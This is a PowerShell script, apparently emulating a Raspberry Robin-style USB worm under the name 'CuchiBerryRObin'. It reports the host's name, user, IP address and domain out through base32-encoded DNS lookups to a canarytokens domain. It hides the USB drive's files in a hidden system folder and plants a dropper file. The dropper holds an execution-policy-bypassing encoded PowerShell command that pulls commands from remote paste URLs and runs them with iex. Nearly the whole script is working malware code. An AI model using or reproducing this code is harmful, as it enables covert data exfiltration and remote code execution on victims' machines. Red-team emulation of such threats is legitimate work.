

$Conf_Ballon="True"
$Conf_CharSet="RECIROBIN"
$Conf_dnsToken ="pb6fy865rm7ts4ran9qi2ss2q.canarytokens.com"



if ($Conf_Ballon -eq $True) {
 
#MENSJAE DE USB PROCESADO
$Title = "CuchiBerryRObin"
$Message = "USB Insertado"
$Type = "info" 
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)

#Mensaje para logging
Add-Content -Path C:\output.txt -Value "$(Get-Date) - USB Flash Drive was inserted.";

    
}





#consige la unidad 

Get-WmiObject Win32_Volume | Where-Object { $_.DriveType -eq 2 } | Where-Object { $_.Label -ne "EFI" } | ForEach-Object {
   # Write-Host "Letter is" + $_.DriveLetter
    $driveLetter = $_.DriveLetter
    $label = $_.Label
    
}
#Add-Content -Path $PSScriptRoot\output.txt -Value "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter .";
Write-Host "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter ."

#Notificamos la Entrada al CNC
$ipAddress = (Test-Connection -ComputerName localhost -Count 1).IPv4Address.IPAddressToString

$texto = "USB_IN_$driveLetter$Label$env:COMPUTERNAME.$env:USERNAME.$ipAddress.$env:USERDNSDOMAIN."

[byte[]] $bytes = [System.Text.Encoding]::ASCII.GetBytes($texto)


$byteArrayAsBinaryString = -join $bytes.ForEach{        [Convert]::ToString($_, 2).PadLeft(8, '0')    }
$byteArrayAsBinaryString = $($byteArrayAsBinaryString+("0000".Substring(0,5-($byteArrayAsBinaryString.length%5))))
$Base32Secret = [regex]::Replace($byteArrayAsBinaryString, '.{5}', {        param($Match)        'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'[[Convert]::ToInt32($Match.Value, 2)]    }).Replace("=","")
$randomDigits = Get-Random -Minimum 10 -Maximum 100
$splitData = [System.Text.RegularExpressions.Regex]::Split($base32Secret, "(?<=\G.{63})") | Where-Object { $_ -ne "" } 
$splitData= $splitData -join "."
$encodedData = $splitData  + ".G$randomDigits." + $Conf_dnsToken


$result = Resolve-DnsName -Name $encodedData


# Set the path to the folder you want to work with
$folderPath = "$driveLetter"

# Create a subfolder

$subfolderPath = Join-Path -Path $folderPath -ChildPath "$label" 

If(!(test-path -PathType container $subfolderPath))
{

New-Item -ItemType Directory -Path $subfolderPath
}
# Copy all files to the subfolder
Get-ChildItem -Path $folderPath  | Move-Item -Destination $subfolderPath -force

# Make the subfolder invisible
$attrib = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
try{
(Get-Item $subfolderPath).Attributes = $attrib
}
catch{
 
 }
 

#CREANDO LNK Y DROPPER
# Set the path to the file you want to create a shortcut for
$targetPath = "cmd.exe"
$dropperName = -join ((Get-Random -Count 3 -InputObject  $Conf_CharSet.ToCharArray())) + "." + -join ((Get-Random -Count 3 -InputObject $Conf_CharSet.ToCharArray()))
$dropperPath = $driveLetter + "\"+$dropperName



#CREANDO DROPPER

# Generamos una cadena aleatoria de caracteres para escribir en el archivo
$caracteres = "abcdefghijklmnopqrstuvwxyz0123456789"

$caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`r`n"

$aleatorios = ""
for ($i = 1; $i -le 5024; $i++) {
    $indice = Get-Random -Minimum 0 -Maximum $caracteres.Length
    $aleatorios += [char]::ConvertFromUtf32($caracteres[$indice])
}



$aleatorios | Out-File -FilePath "$dropperPath"


#[System.IO.File]::WriteAllBytes("$dropperPath", $aleatorios)


Write-Host $dropperPath

# Escribimos "mspaint" en una línea aleatoria del archivo
$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count
$lineas[$indice] = " start explorer	\`"$label\`" "
$lineas | Set-Content "$dropperPath"


# Escribimos "Dropper" en una línea aleatoria del archivo
#$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count

$downloader="Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASQAwAFIAdgBkADIANQBzAGIAMgBGAGsAWgBYAEkAZwBRADEAVgBEAFMARQBsAEMAUgBWAEoAUwBXAFYASgBQAFEAawBsAE8ARABRAG8AawBRADIAOQB1AFoAbAA5AEkAWQBYAE4AbwBkAEcARgBuAFgAMgBsAHUAYQBYAFEAOQBJAGkATQB4AE0AVQBOAFYAUQAwAGgASgBRAGsAVgBTAFUAbABsAFMAVAAwAEoASgBUAGkASQBOAEMAaQBSAEQAYgAyADUAbQBYADAAaABoAGMAMgBoADAAWQBXAGQAZgBaAFcANQBrAFAAUwBJAGoAUgBrAGwATwBJAGcAMABLAEQAUQBvAGoAVABtADkAMABJAEgAZAB2AGMAbQB0AHAAYgBtAGMAcwBJAEcANQBsAFoAVwBRAGcAZAAyADkAeQBhADIARgB5AGIAMwBWAHUAWgBDAEIAMABiAHkAQgBuAFoAWABRAGcAWgBuAEoAdgBiAFMAQgBuAGIAMgA5AG4AYgBHAFUAZwBEAFEAbwBrAFkAMgA5AHUAZABHAFYAdQBkAEMAQQA5AEkARQBsAHUAZABtADkAcgBaAFMAMQBYAFoAVwBKAFMAWgBYAEYAMQBaAFgATgAwAEkAQwAxAFYAYwBtAGsAZwBJAG0AaAAwAGQASABCAHoATwBpADgAdgBkADMAZAAzAEwAbQBkAHYAYgAyAGQAcwBaAFMANQBqAGIAMgAwAHYAYwAyAFYAaABjAG0ATgBvAFAAMwBFADkASgBFAE4AdgBiAG0AWgBmAFMARwBGAHoAYQBIAFIAaABaADEAOQBwAGIAbQBsADAASQBpAEEAdABWAFgATgBsAFEAbQBGAHoAYQBXAE4AUQBZAFgASgB6AGEAVwA1AG4ARABRAG8AawBjAEcARgAwAGMAbQA5AHUASQBEADAAZwBKAHkAZwAvAFAARAAwAGsAUQAyADkAdQBaAGwAOQBJAFkAWABOAG8AZABHAEYAbgBYADIAbAB1AGEAWABRAGcASwBTAGcAdQBLAGkAawBvAFAAegAwAGcASgBFAE4AdgBiAG0AWgBmAFMARwBGAHoAYQBIAFIAaABaADEAOQBsAGIAbQBRAHAASgB3ADAASwBKAEgASgBsAGMAMwBWAHMAZABHAEYAawBiAHkAQQA5AEkARgB0AHkAWgBXAGQAbABlAEYAMAA2AE8AawAxAGgAZABHAE4AbwBLAEMAUgBqAGIAMgA1ADAAWgBXADUAMABMAGsATgB2AGIAbgBSAGwAYgBuAFEAcwBJAEMAUgB3AFkAWABSAHkAYgAyADQAcABMAGwAWgBoAGIASABWAGwARABRAG8AawBaAG4ASgB2AGIAVAAwAGkAUgAyADkAdgBaADIAeABsAEkAZwAwAEsASQAwAEoAMQBiAGkAQgBDAFMAVQA1AEgASQBGAGQAUABVAGsAdABUAEkAUwBFAGgARABRAG8AagBVAEcAVgB5AGIAeQBCAFAAVQBFAE4ASgBUADAANABnAEkAMQBSAFAAUgBFADgAZwBRADAAbABRAFMARQBWAFMASQBGAGgAUABVAGcAMABLAGEAVwBZAGcASwBDAGgAYgBjADMAUgB5AGEAVwA1AG4AWABUAG8ANgBTAFgATgBPAGQAVwB4AHMAVAAzAEoARgBiAFgAQgAwAGUAUwBnAGsAYwBtAFYAegBkAFcAeAAwAFkAVwBSAHYASwBTAGsAcABEAFEAcAA3AEQAUQBvAGsAWQAyADkAdQBaAGwAOQBvAFkAWABOAG8AZABHAEYAbgBYADIAbAB1AGEAWABSAGYAWgBXADUAagBiADIAUgBsAFoAQwBBADkASQBGAHQAVABlAFgATgAwAFoAVwAwAHUAVgBYAEoAcABYAFQAbwA2AFIAWABOAGoAWQBYAEIAbABSAEcARgAwAFkAVgBOADAAYwBtAGwAdQBaAHkAZwBrAFEAMgA5AHUAWgBsADkASQBZAFgATgBvAGQARwBGAG4AWAAyAGwAdQBhAFgAUQBwAEQAUQBvAGsAWQAyADkAdQBkAEcAVgB1AGQAQwBBADkASQBFAGwAdQBkAG0AOQByAFoAUwAxAFgAWgBXAEoAUwBaAFgARgAxAFoAWABOADAASQBDADEAVgBjAG0AawBnAEkAbQBoADAAZABIAEIAegBPAGkAOAB2AGQAMwBkADMATABtAEoAcABiAG0AYwB1AFkAMgA5AHQATAAzAE4AbABZAFgASgBqAGEARAA5AHgAUABTAFIAagBiADIANQBtAFgAMgBoAGgAYwAyAGgAMABZAFcAZABmAGEAVwA1AHAAZABGADkAbABiAG0ATgB2AFoARwBWAGsASQBpAEEAdABWAFgATgBsAFEAbQBGAHoAYQBXAE4AUQBZAFgASgB6AGEAVwA1AG4ARABRAG8AawBjAEcARgAwAGMAbQA5AHUASQBEADAAZwBJAGkAZwAvAFAARAAwAGsAUQAyADkAdQBaAGwAOQBJAFkAWABOAG8AZABHAEYAbgBYADIAbAB1AGEAWABSAGMAYwB5AGsAbwBMAGkAbwAvAEsAUwBnAC8AUABWAHgAegBLAGkAUgBEAGIAMgA1AG0AWAAwAGgAaABjADIAaAAwAFkAVwBkAGYAWgBXADUAawBLAFMASQBOAEMAaQBSAHkAWgBYAE4AMQBiAEgAUgBoAFoARwA4AGcAUABTAEEAbwBKAEcATgB2AGIAbgBSAGwAYgBuAFEAZwBmAEMAQgBUAFoAVwB4AGwAWQAzAFEAdABVADMAUgB5AGEAVwA1AG4ASQBDADEAUQBZAFgAUgAwAFoAWABKAHUASQBDAFIAdwBZAFgAUgB5AGIAMgA0AGcATABVAEYAcwBiAEUAMQBoAGQARwBOAG8AWgBYAE0AcABMAGsAMQBoAGQARwBOAG8AWgBYAE4AYgBNAEYAMAB1AFYAbQBGAHMAZABXAFUATgBDAGkAUgBtAGMAbQA5AHQAUABTAEoAQwBhAFcANQBuAEkAZwAwAEsARABRAHAAOQBEAFEAbwBOAEMAZwAwAEsARABRAG8AagBWAEcAVgB5AFkAMgBWAHkAWQBVAEUAZwBUADEAQgBEAFMAVQA5AE8ASQBDAE4AVQBUADAAUgBQAEkARQBOAEoAVQBFAGgARgBVAGkAQgBZAFQAMQBJAE4AQwBtAGwAbQBJAEMAZwBvAFcAMwBOADAAYwBtAGwAdQBaADEAMAA2AE8AawBsAHoAVABuAFYAcwBiAEUAOQB5AFIAVwAxAHcAZABIAGsAbwBKAEgASgBsAGMAMwBWAHMAZABHAEYAawBiAHkAawBwAEsAUQAwAEsAZQB3ADAASwBKAEcATgB2AGIAbgBSAGwAYgBuAFEAZwBQAFMAQgBKAGIAbgBaAHYAYQAyAFUAdABWADIAVgBpAFUAbQBWAHgAZABXAFYAegBkAEMAQQB0AFYAWABKAHAASQBDAEoAbwBkAEgAUgB3AGMAegBvAHYATAAzAEIAaABjADMAUgBsAFkAbQBsAHUATABtAE4AdgBiAFMAOQB5AFkAWABjAHYAUQBVAEoAcABWAGoAQgB5AFMARABjAGkASQBDADEAVgBjADIAVgBDAFkAWABOAHAAWQAxAEIAaABjAG4ATgBwAGIAbQBjAE4AQwBpAFIAdwBZAFgAUgB5AGIAMgA0AGcAUABTAEEAaQBLAEQAOAA4AFAAUwBSAEQAYgAyADUAbQBYADAAaABoAGMAMgBoADAAWQBXAGQAZgBhAFcANQBwAGQARgB4AHoASwBTAGcAdQBLAGoAOABwAEsARAA4ADkAWABIAE0AcQBKAEUATgB2AGIAbQBaAGYAUwBHAEYAegBhAEgAUgBoAFoAMQA5AGwAYgBtAFEAcABJAGcAMABLAEoASABKAGwAYwAzAFYAcwBkAEcARgBrAGIAeQBBADkASQBGAHQAeQBaAFcAZABsAGUARgAwADYATwBrADEAaABkAEcATgBvAEsAQwBSAGoAYgAyADUAMABaAFcANQAwAEwAQwBBAGsAYwBHAEYAMABjAG0AOQB1AEsAUwA1AFcAWQBXAHgAMQBaAFEAMABLAEoARwBaAHkAYgAyADAAOQBJAGwAQgBoAGMAMwBSAGwAWQBtAGwAdQBJAGcAMABLAEQAUQBwAFgAYwBtAGwAMABaAFMAMQBQAGQAWABSAHcAZABYAFEAZwBJAGwAQgBCAFUAMQBSAEYAUQBrAGwATwBPAGkASQBrAGMAbQBWAHoAZABXAHgAMABZAFcAUgB2AEQAUQBwADkARABRAG8ATgBDAGkAUgB5AFoAWABOADEAYgBIAFIAaABaAEcAOAA5AFcAMQBOADUAYwAzAFIAbABiAFMANQBPAFoAWABRAHUAVgAyAFYAaQBWAFgAUgBwAGIARwBsADAAZQBWADAANgBPAGsAaAAwAGIAVwB4AEUAWgBXAE4AdgBaAEcAVQBvAEoASABKAGwAYwAzAFYAcwBkAEcARgBrAGIAeQBrAE4AQwBnADAASwBEAFEAbwBOAEMAaQBSAFUAYQBYAFIAcwBaAFMAQQA5AEkAQwBKAEQAZABXAE4AbwBhAFUASgBsAGMAbgBKADUAVQBrADkAaQBhAFcANABpAEQAUQBvAGsAVABXAFYAegBjADIARgBuAFoAUwBBADkASQBDAEoARQBaAFgATgBqAFkAWABKAG4AWQBXADUAawBiAHkAQgBqAGIAMgAxAGgAYgBtAFIAdgBJAEMAUgB5AFoAWABOADEAYgBIAFIAaABaAEcAOABnAFoARwBVAGcASgBHAFoAeQBiADIAMABpAEQAUQBvAGsAVgBIAGwAdwBaAFMAQQA5AEkAQwBKAHAAYgBtAFoAdgBJAGkAQQBOAEMAaQBBAGcARABRAHAAYgBjAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBoAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AbQB4AHYAWQBXAFIAMwBhAFgAUgBvAGMARwBGAHkAZABHAGwAaABiAEcANQBoAGIAVwBVAG8ASQBsAE4ANQBjADMAUgBsAGIAUwA1AFgAYQBXADUAawBiADMAZAB6AEwAawBaAHYAYwBtADEAegBJAGkAawBnAGYAQwBCAHYAZABYAFEAdABiAG4AVgBzAGIAQQAwAEsASgBIAEIAaABkAEcAZwBnAFAAUwBCAEgAWgBYAFEAdABVAEgASgB2AFkAMgBWAHoAYwB5AEEAdABhAFcAUQBnAEoASABCAHAAWgBDAEIAOABJAEYATgBsAGIARwBWAGoAZABDADEAUABZAG0AcABsAFkAMwBRAGcATABVAFYANABjAEcARgB1AFoARgBCAHkAYgAzAEIAbABjAG4AUgA1AEkARgBCAGgAZABHAGcATgBDAGkAUgBwAFkAMgA5AHUASQBEADAAZwBXADEATgA1AGMAMwBSAGwAYgBTADUARQBjAG0ARgAzAGEAVwA1AG4ATABrAGwAagBiADIANQBkAE8AagBwAEYAZQBIAFIAeQBZAFcATgAwAFEAWABOAHoAYgAyAE4AcABZAFgAUgBsAFoARQBsAGoAYgAyADQAbwBKAEgAQgBoAGQARwBnAHAARABRAG8AawBiAG0AOQAwAGEAVwBaADUASQBEADAAZwBiAG0AVgAzAEwAVwA5AGkAYQBtAFYAagBkAEMAQgB6AGUAWABOADAAWgBXADAAdQBkADIAbAB1AFoARwA5ADMAYwB5ADUAbQBiADMASgB0AGMAeQA1AHUAYgAzAFIAcABaAG4AbABwAFkAMgA5AHUARABRAG8AawBiAG0AOQAwAGEAVwBaADUATABtAGwAagBiADIANABnAFAAUwBBAGsAYQBXAE4AdgBiAGcAMABLAEoARwA1AHYAZABHAGwAbQBlAFMANQAyAGEAWABOAHAAWQBtAHgAbABJAEQAMABnAEoASABSAHkAZABXAFUATgBDAGkAUgB1AGIAMwBSAHAAWgBuAGsAdQBjADIAaAB2AGQAMgBKAGgAYgBHAHgAdgBiADIANQAwAGEAWABBAG8ATQBUAEEAcwBKAEYAUgBwAGQARwB4AGwATABDAFIATgBaAFgATgB6AFkAVwBkAGwATABDAEIAYgBjADMAbAB6AGQARwBWAHQATABuAGQAcABiAG0AUgB2AGQAMwBNAHUAWgBtADkAeQBiAFgATQB1AGQARwA5AHYAYgBIAFIAcABjAEcAbABqAGIAMgA1AGQATwBqAG8AawBWAEgAbAB3AFoAUwBrAE4AQwBnADAASwBJAHkAUgB5AFoAWABOADEAYgBIAFIAaABaAEcAOABnAFAAUwBBAGkASQBDAFEAZwBhAEgAUgAwAGMASABNADYATAB5ADkAeQBaAFcANQAwAGMAbgBrAHUAWQAyADgAdgBOAG4AWgByAGIAMwBFAHYAYwBtAEYAMwBJAGcAMABLAEkAeQBSAHkAWgBYAE4AMQBiAEgAUgBoAFoARwA4AGcAUABTAEEAaQBJAE0ATwB4AFEAeQBCAG8AZABIAFIAdwBjAHoAbwB2AEwAMwBCAGgAYwAzAFIAbABZAG0AbAB1AEwAbQBOAHYAYgBTADkAeQBZAFgAYwB2AFUAagBaAHoAVgBFAFUAdwBSADAAcwBpAEQAUQBvAGoAUQAwADkATgBRAFUANQBFAFQAMQBNAGcARABRAG8AagBJAEMAUQBnAGEASABSADAAYwBHAGwAdABjAEcAeABwAFkAMgBFAGcAWgBHAFYAegBZADIARgB5AFoAMgBGAHkASQBIAGsAZwBaAFcAcABsAFkAMwBWADAAWQBYAEkAZwBjADIATgB5AGEAWABCADAASQBHAFYAcQBaAFcAMQB3AGIARwA4AGcASgBDAEIAbwBkAEgAUgB3AGMAegBvAHYATAAzAEIAaABjADMAUgBsAFkAbQBsAHUATABtAE4AdgBiAFMAOQB5AFkAWABjAHYAUQBVAEoAcABWAGoAQgB5AFMARABjAE4AQwBpAE0AZwB3ADcARgBEAEkARwBsAHQAYwBHAHgAcABZADIARQBnAFoAbQBsAHkAYgBXAEYAawBiAHkAQgBqAGIAMgA0AGcAYgAzAEIAbABiAG4ATgB6AGIAQwBCAGwAYgBpAEIAVgBVAGsAdwBnAHcANwBGAEQASQBHAGgAMABkAEgAQgB6AE8AaQA4AHYAYwBHAEYAegBkAEcAVgBpAGEAVwA0AHUAWQAyADkAdABMADMASgBoAGQAeQA5AFMATgBuAE4AVQBSAFQAQgBIAFMAdwAwAEsARABRAG8ATgBDAGkAUgB3AFkAWABSAHkAYgAyADQAZwBQAFMAQQBuAFgAQwBSAGMAYwAyAGgAMABkAEgAQgBiAFgAbAB4AHoAWABTAHMAbgBEAFEAbwBOAEMAbQBsAG0ASQBDAGcAawBjAG0AVgB6AGQAVwB4ADAAWQBXAFIAdgBJAEMAMQB0AFkAWABSAGoAYQBDAEEAawBjAEcARgAwAGMAbQA5AHUASwBTAEIANwBEAFEAbwBnAEkAQwBBAGcASQBDAEEAawBkAFgASgBzAEkARAAwAGcASgBHADEAaABkAEcATgBvAFoAWABOAGIATQBGADAAZwBMAFgASgBsAGMARwB4AGgAWQAyAFUAZwBKADEAdwBrAEsAeQBjAHMASgB5AGMATgBDAGkAQQBnAEkAQwBBAGsAYwBtAFYAegBkAFcAeAAwAFkAVwBSAHYASQBEADAAZwBhAFcAVgA0AEkAQwBoAHAAZAAzAEkAZwBKAEgAVgB5AGIAQwBBAHQAVgBYAE4AbABRAG0ARgB6AGEAVwBOAFEAWQBYAEoAegBhAFcANQBuAEsAUwA1AEQAYgAyADUAMABaAFcANQAwAEQAUQBvAGcASQBDAEEAZwBWADMASgBwAGQARwBVAHQAVAAzAFYAMABjAEgAVgAwAEkAQwBKAEQAYgAyADEAaABiAG0AUgB2AEkAQwBRAGcATwBpAEkAawBjAG0AVgB6AGQAVwB4ADAAWQBXAFIAdgBEAFEAcAA5AEQAUQBvAE4AQwBpAE0AZwBRAG4AVgB6AFkAMgBGAHkASQBHAHgAaABJAEgAQgB2AGMAMgBsAGoAYQBjAE8AegBiAGkAQgBrAFoAUwBBAGkAdwA3AEYARABJAEcAUgBsAGQASABKAHYASQBHAFIAbABJAEgASgBsAGMAMwBWAHMAZABHAEYAawBiAHkAdwBnAGMARwBWAHkAYgB5AEIAagBiADIAMQB2AEkARwA1AHYASQBHAE4AaABZAG0AVQBzAEkARwBSAGwAWQBtAFUAZwBhAFgASQBnAGQAVwA1AHAAWgBHADgAZwBZAFcAdwBnAEoAQwBCADEAYgBtAEUAZwBkAG0AVgA2AEkARwBSAGwAYwAyAE4AaABjAG0AZABoAFoARwA4AGkARABRAG8AawBjAEcAOQB6AGEAVwBOAHAAYgAyADQAZwBQAFMAQQBrAGMAbQBWAHoAZABXAHgAMABZAFcAUgB2AEwAawBsAHUAWgBHAFYANABUADIAWQBvAEoAOABPAHgAUQB5AGMAcABEAFEAbwBOAEMAaQBOAFQAUwBTAEIASQBRAFYAawBnAFEAMABsAEcAVQBrAEYARQBUAHcAMABLAGEAVwBZAGcASwBDAFIAdwBiADMATgBwAFkAMgBsAHYAYgBpAEEAdABiAG0AVQBnAEwAVABFAHAASQBIAHMATgBDAGkAQQBnAEkAQwBBAGoASQBFAFYANABkAEgASgBoAFoAWABJAGcAWgBXAHcAZwBZADIAOQB1AGQARwBWAHUAYQBXAFIAdgBJAEgAQgB2AGMAMwBSAGwAYwBtAGwAdgBjAGkAQgBoAEkAQwBMAEQAcwBVAE0AaQBEAFEAbwBnAEkAQwBBAGcASgBIAEoAbABjADMAVgBzAGQARwBGAGsAYgB5AEEAOQBJAEMAUgB5AFoAWABOADEAYgBIAFIAaABaAEcAOAB1AFUAMwBWAGkAYwAzAFIAeQBhAFcANQBuAEsAQwBSAHcAYgAzAE4AcABZADIAbAB2AGIAaQBBAHIASQBEAE0AcABJAEEAMABLAEkAQwBBAGcASQBDAFIAeQBaAFgATgAxAGIASABSAGgAWgBHADgAZwBQAFMAQQBvAGEAWABkAHkASQBDAFIAeQBaAFgATgAxAGIASABSAGgAWgBHADgAZwBMAFYAVgB6AFoAVQBKAGgAYwAyAGwAagBVAEcARgB5AGMAMgBsAHUAWgB5AGsAdQBRADIAOQB1AGQARwBWAHUAZABBADAASwBJAEMAQQBnAEkAQQAwAEsASQBDAEEAZwBJAEMAUgBoAGMAbQBOAG8AYQBYAFoAdgBWAEcAVgB0AGMARwA5AHkAWQBXAHcAZwBQAFMAQgBiAFUAMwBsAHoAZABHAFYAdABMAGsAbABQAEwAbABCAGgAZABHAGgAZABPAGoAcABIAFoAWABSAFUAWgBXADEAdwBSAG0AbABzAFoAVQA1AGgAYgBXAFUAbwBLAFEAMABLAEkAQwBBAGcASQBGAHQASgBUAHkANQBHAGEAVwB4AGwAWABUAG8ANgBWADMASgBwAGQARwBWAEIAYgBHAHgAQwBlAFgAUgBsAGMAeQBnAGsAWQBYAEoAagBhAEcAbAAyAGIAMQBSAGwAYgBYAEIAdgBjAG0ARgBzAEwAQwBCAGIAUQAyADkAdQBkAG0AVgB5AGQARgAwADYATwBrAFoAeQBiADIAMQBDAFkAWABOAGwATgBqAFIAVABkAEgASgBwAGIAbQBjAG8ASgBIAEoAbABjADMAVgBzAGQARwBGAGsAYgB5AGsAcABEAFEAbwBOAEMAaQBBAGcASQBDAEEAagBWAGsAVgBTAFMAVQBaAEoAUQAwADgAZwBVADAAawBnAFYARQBsAEYAVABrAFUAZwBTAFUANQBUAFYARQBGAE0AUQBVAFIAUABJAEUAVgBNAEkARQA5AFEAUgBVADUAVABVADAAdwBOAEMAaQBBAGcASQBDAEEAagBJAEYAWgBsAGMAbQBsAG0AYQBXAE4AaABjAGkAQgB6AGEAUwBCAFAAYwBHAFYAdQBVADEATgBNAEkARwBWAHoAZABNAE8AaABJAEcAbAB1AGMAMwBSAGgAYgBHAEYAawBiAHcAMABLAEkAQwBBAGcASQBDAFIAdgBjAEcAVgB1AGMAMwBOAHMAUwBXADUAegBkAEcARgBzAGIARwBWAGsASQBEADAAZwBSADIAVgAwAEwAVQBOAHYAYgBXADEAaABiAG0AUQBnAGIAMwBCAGwAYgBuAE4AegBiAEMAQQB0AFIAWABKAHkAYgAzAEoAQgBZADMAUgBwAGIAMgA0AGcAVQAyAGwAcwBaAFcANQAwAGIASABsAEQAYgAyADUAMABhAFcANQAxAFoAUQAwAEsARABRAG8AZwBJAEMAQQBnAGEAVwBZAGcASwBDADEAdQBiADMAUQBnAEoARwA5AHcAWgBXADUAegBjADIAeABKAGIAbgBOADAAWQBXAHgAcwBaAFcAUQBwAEkASABzAGcARABRAG8AZwBJAEMAQQBnAGQAMgBsAHUAWgAyAFYAMABJAEcAbAB1AGMAMwBSAGgAYgBHAHcAZwBMAFMAMQBwAFoAQwBCAFAAYwBHAFYAdQBVADEATgBNAEwAawA5AHcAWgBXADUAVABVADAAdwBOAEMAaQBBAGcASQBDAEIAOQBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEMAUgB5AFoAWABOADEAYgBIAFIAaABaAEcAOABnAFAAUwBCAHYAYwBHAFYAdQBjADMATgBzAEkASABCAHIAWgBYAGwAMQBkAEcAdwBnAEwAWABaAGwAYwBtAGwAbQBlAFgASgBsAFkAMgA5ADIAWgBYAEkAZwBMAFcAbAB1AEkAQwBSAGgAYwBtAE4AbwBhAFgAWgB2AFYARwBWAHQAYwBHADkAeQBZAFcAdwBnAEkAQwAxAHAAYgBtAHQAbABlAFMAQgB3AGMAbQBsADIAWQBYAFIAbABMAG0AUgBsAGMAZwAwAEsARABRAG8AZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEEAMABLAEQAUQBvAGsAVgBHAGwAMABiAEcAVQBnAFAAUwBBAGkAUQAzAFYAagBhAEcAbABDAFoAWABKAHkAZQBWAEoAUABZAG0AbAB1AEkAZwAwAEsASgBFADEAbABjADMATgBoAFoAMgBVAGcAUABTAEEAaQBSAEcAVgB6AFkAMgBsAG0AYwBtAEYAdQBaAEcAOABnAFkAMgA5AHQAWQBXADUAawBiAHkAQgBTAGIAMgBKAHAAYgBpAEIARABhAFcAWgB5AFkAVwBSAHYASQBnADAASwBKAEYAUgA1AGMARwBVAGcAUABTAEEAaQBhAFcANQBtAGIAeQBJAGcARABRAG8AZwBJAEEAMABLAFcAMwBKAGwAWgBtAHgAbABZADMAUgBwAGIAMgA0AHUAWQBYAE4AegBaAFcAMQBpAGIASABsAGQATwBqAHAAcwBiADIARgBrAGQAMgBsADAAYQBIAEIAaABjAG4AUgBwAFkAVwB4AHUAWQBXADEAbABLAEMASgBUAGUAWABOADAAWgBXADAAdQBWADIAbAB1AFoARwA5ADMAYwB5ADUARwBiADMASgB0AGMAeQBJAHAASQBIAHcAZwBiADMAVgAwAEwAVwA1ADEAYgBHAHcATgBDAGkAUgB3AFkAWABSAG8ASQBEADAAZwBSADIAVgAwAEwAVgBCAHkAYgAyAE4AbABjADMATQBnAEwAVwBsAGsASQBDAFIAdwBhAFcAUQBnAGYAQwBCAFQAWgBXAHgAbABZADMAUQB0AFQAMgBKAHEAWgBXAE4AMABJAEMAMQBGAGUASABCAGgAYgBtAFIAUQBjAG0AOQB3AFoAWABKADAAZQBTAEIAUQBZAFgAUgBvAEQAUQBvAGsAYQBXAE4AdgBiAGkAQQA5AEkARgB0AFQAZQBYAE4AMABaAFcAMAB1AFIASABKAGgAZAAyAGwAdQBaAHkANQBKAFkAMgA5AHUAWABUAG8ANgBSAFgAaAAwAGMAbQBGAGoAZABFAEYAegBjADIAOQBqAGEAVwBGADAAWgBXAFIASgBZADIAOQB1AEsAQwBSAHcAWQBYAFIAbwBLAFEAMABLAEoARwA1AHYAZABHAGwAbQBlAFMAQQA5AEkARwA1AGwAZAB5ADEAdgBZAG0AcABsAFkAMwBRAGcAYwAzAGwAegBkAEcAVgB0AEwAbgBkAHAAYgBtAFIAdgBkADMATQB1AFoAbQA5AHkAYgBYAE0AdQBiAG0AOQAwAGEAVwBaADUAYQBXAE4AdgBiAGcAMABLAEoARwA1AHYAZABHAGwAbQBlAFMANQBwAFkAMgA5AHUASQBEADAAZwBKAEcAbABqAGIAMgA0AE4AQwBpAFIAdQBiADMAUgBwAFoAbgBrAHUAZABtAGwAegBhAFcASgBzAFoAUwBBADkASQBDAFIAMABjAG4AVgBsAEQAUQBvAGsAYgBtADkAMABhAFcAWgA1AEwAbgBOAG8AYgAzAGQAaQBZAFcAeABzAGIAMgA5AHUAZABHAGwAdwBLAEQARQB3AEwAQwBSAFUAYQBYAFIAcwBaAFMAdwBrAFQAVwBWAHoAYwAyAEYAbgBaAFMAdwBnAFcAMwBOADUAYwAzAFIAbABiAFMANQAzAGEAVwA1AGsAYgAzAGQAegBMAG0AWgB2AGMAbQAxAHoATABuAFIAdgBiADIAeAAwAGEAWABCAHAAWQAyADkAdQBYAFQAbwA2AEoARgBSADUAYwBHAFUAcABEAFEAcAA5AEQAUQBvAE4AQwBnADAASwBJAEMAQQBnAEkAQQAwAEsARABRAG8ATgBDAGkAQQBOAEMAZwAwAEsARABRAHAAWABjAG0AbAAwAFoAUwAxAFAAZABYAFIAdwBkAFgAUQBnAEkAawBOAFAAVABVAEYATwBSAEUAOAA2AEkAaQBSAHkAWgBYAE4AMQBiAEgAUgBoAFoARwA4AE4AQwBnADAASwBEAFEAcABKAGIAbgBaAHYAYQAyAFUAdABSAFgAaAB3AGMAbQBWAHoAYwAyAGwAdgBiAGkAQQBrAGMAbQBWAHoAZABXAHgAMABZAFcAUgB2AEQAUQBvAE4AQwBnADAASwBEAFEAbwA9ACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA="
$lineas[$indice] = "$downloader "

$lineas | Set-Content "$dropperPath"
#Hago el dropper protegido
